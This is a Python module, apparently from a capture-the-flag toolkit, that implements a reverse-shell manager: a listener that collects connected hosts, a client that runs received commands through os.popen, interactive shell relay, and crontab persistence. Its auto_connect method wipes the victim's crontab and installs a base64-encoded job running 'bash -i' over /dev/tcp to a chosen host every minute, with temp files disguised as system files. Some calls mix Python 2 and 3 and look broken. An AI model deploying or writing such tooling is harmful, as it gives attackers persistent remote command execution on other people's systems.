import socket
import threading
import time
import signal
import random
import string
import os
import sys
from .Log import Log
from .utils import md5
# from library import app
"""
    参考自
 https://github.com/WangYihang/Reverse-Shell-Manager
 <wangyihanger@gmail.com>

"""

# config = app.current_game_config

slaves = {}
masters = {}


EXIT_FLAG = False
MAX_CONNECTION_NUMBER = 0x20


def recvuntil(p, target):
    data = b""
    while target.encode('utf-8') not in data:
        data += p.recv(1)
    return data.decode('utf-8')


def recvall(socket_fd):
    data = b""
    size = 0x100
    while True:
        r = socket_fd.recv(size)
        if not r:
            break
        data += r
        if len(r) < size:
            break
    return data.decode('utf-8')


def slaver(host, port, fake):
    slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    slaver_fd.connect((host, port))
    banner = b"[FakeTerminal] >> "
    while True:
        if EXIT_FLAG:
            Log.warning("Slaver function exiting...")
            break
        command = recvuntil(slaver_fd, "\n")
        if fake:
            slaver_fd.send(banner)
        # Log.info("Executing : %r" % (command))
        try:
            result = os.popen(command).read()
        except:
            result = ""
        slaver_fd.send((command + result).encode('utf-8'))
    Log.warning("Closing connection...")
    slaver_fd.shutdown(socket.SHUT_RDWR)
    slaver_fd.close()


def transfer(h):
    slave = slaves[h]
    socket_fd = slave.socket_fd
    buffer_size = 0x400
    interactive_stat = True
    while True:
        if EXIT_FLAG:
            Log.warning("Transfer function exiting...")
            break
        interactive_stat = slave.interactive
        buffer = socket_fd.recv(buffer_size)
        if not buffer:
            Log.error("No data, breaking...")
            break
        sys.stdout.write(buffer.decode('utf-8'))
        if not interactive_stat:
            break
    if interactive_stat:
        Log.error("Unexpected EOF!")
        socket_fd.shutdown(socket.SHUT_RDWR)
        socket_fd.close()
        slave.remove_node()


def random_string(length, chars):
    return "".join([random.choice(chars) for i in range(length)])


class Slave():
    def __init__(self, socket_fd):
        self.socket_fd = socket_fd
        self.hostname, self.port = socket_fd.getpeername()
        self.node_hash = node_hash(self.hostname, self.port)
        self.interactive = False

    def show_info(self):
        Log.info("Hash : %s" % (self.node_hash))
        Log.info("From : %s:%d" % (self.hostname, self.port))
        Log.info("ISP : %s-%s" % (self.country, self.isp))
        Log.info("Location : %s-%s-%s" % (self.area, self.region, self.city))

    def send_command(self, command):
        try:
            self.socket_fd.send(command + b"\n")
            return True
        except:
            self.remove_node()
            return False

    def system_token(self, command):
        token = random_string(0x10, string.letters)
        payload = "echo '%s' && %s ; echo '%s'\n" % (token, command, token)
        Log.info(payload)
        self.send_command(payload)
        time.sleep(0.2)
        result = recvall(self.socket_fd)
        print("%r" % (result))
        if len(result.split(token)) == 3:
            return result.split(token)[1]
        else:
            return "Somthing wrong"

    def send_command_log(self, command):
        log_file = "./log/%s.log" % (time.strftime(
            "%Y-%m-%d_%H:%M:%S", time.localtime()))
        Log.info("Log file : %s" % (log_file))
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)
        with open(log_file, "a+") as f:
            f.write("[%s]\n" % ("-" * 0x20))
            f.write("From : %s:%d\n" % (self.hostname, self.port))
            f.write(u"ISP : %s-%s\n" % (self.country, self.isp))
            f.write(u"Location : %s-%s-%s\n" %
                    (self.area, self.region, self.city))
            f.write("Command : %s\n" % (command))
            f.write("%s\n" % (result))

    def send_command_print(self, command):
        print(">>>>>> %s" % command)
        self.send_command(command)
        time.sleep(0.5)
        Log.info("Receving data from socket...")
        result = recvall(self.socket_fd)
        Log.success(result)

    def interactive_shell(self):
        self.interactive = True
        t = threading.Thread(target=transfer, args=(self.node_hash, ))
        t.start()
        try:
            while True:
                command = input("")
                if command == "exit":
                    self.interactive = False
                    self.socket_fd.send(b"\n")
                    break
                self.socket_fd.send((command + "\n").encode('utf-8'))
        except:
            self.remove_node()
        self.interactive = False
        time.sleep(0.125)

    def save_crontab(self, target_file):
        command = "crontab -l > %s" % (target_file)
        self.send_command_print(command)

    def add_crontab(self, content):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (
            random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 3. Add a new task
        content = content + "\n"
        Log.info("Add new tasks : %s" % (content))
        command = 'echo "%s" | base64 -d >> %s' % (
            content.encode("base64").replace("\n", ""), target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print(recvall(self.socket_fd))

    def del_crontab(self, pattern):
        # 1. Save old crontab
        Log.info("Saving old crontab")
        chars = string.letters + string.digits
        target_file = "/tmp/%s-system.server-%s" % (
            random_string(0x20, chars), random_string(0x08, chars))
        self.save_crontab(target_file)
        # 2. Delete old reverse shell tasks
        Log.info("Removing old tasks in crontab...")
        command = 'sed -i "/bash/d" %s' % (target_file)
        self.send_command(command)
        # 4. Rescue crontab file
        Log.info("Rescuing crontab file...")
        command = 'crontab %s' % (target_file)
        self.send_command(command)
        # 5. Delete temp file
        Log.info("Deleting temp file...")
        command = "rm -rf %s" % (target_file)
        self.send_command(command)
        # 6. Receving buffer data
        print(recvall(self.socket_fd))

    def auto_connect(self, target_host, target_port):
        # self.del_crontab("bash")
        content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (
            target_host, target_port)
        # self.add_crontab(content)
        self.system_token("crontab -r;echo '%s'|base64 -d|crontab" %
                          (content.encode("base64").replace("\n", "")))

    def remove_node(self):
        Log.error("Removing Node!")
        if self.node_hash in slaves.keys():
            slaves.pop(self.node_hash)


def master(host, port):
    Log.info("Master starting at %s:%d" % (host, port))
    master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    master_fd.bind((host, port))
    master_fd.listen(MAX_CONNECTION_NUMBER)
    while(True):
        if EXIT_FLAG:
            break
        slave_fd, slave_addr = master_fd.accept()
        Log.success("\r[+] Slave online : %s:%d" %
                    (slave_addr[0], slave_addr[1]))
        repeat = False
        for i in slaves.keys():
            slave = slaves[i]
            if slave.hostname == slave_addr[0]:
                repeat = True
                break
        if repeat:
            Log.warning("Detect the same host connection, reseting...")
            slave_fd.shutdown(socket.SHUT_RDWR)
            slave_fd.close()
        else:
            slave = Slave(slave_fd)
            slaves[slave.node_hash] = slave
    Log.error("Master exiting...")
    master_fd.shutdown(socket.SHUT_RDWR)
    master_fd.close()


def signal_handler(ignum, frame):
    print("")
    # show_commands()


def node_hash(host, port):
    return md5("%s:%d" % (host, port))


def run(host="0.0.0.0", port=7777):
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    master_thread = threading.Thread(target=master, args=(host, port,))
    slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
    master_thread.daemon = True
    slaver_thread.daemon = True
    Log.info("Starting server...")
    master_thread.start()
    Log.info("Connecting to localhost server...")
    slaver_thread.start()


if __name__ == "__main__":
    run()
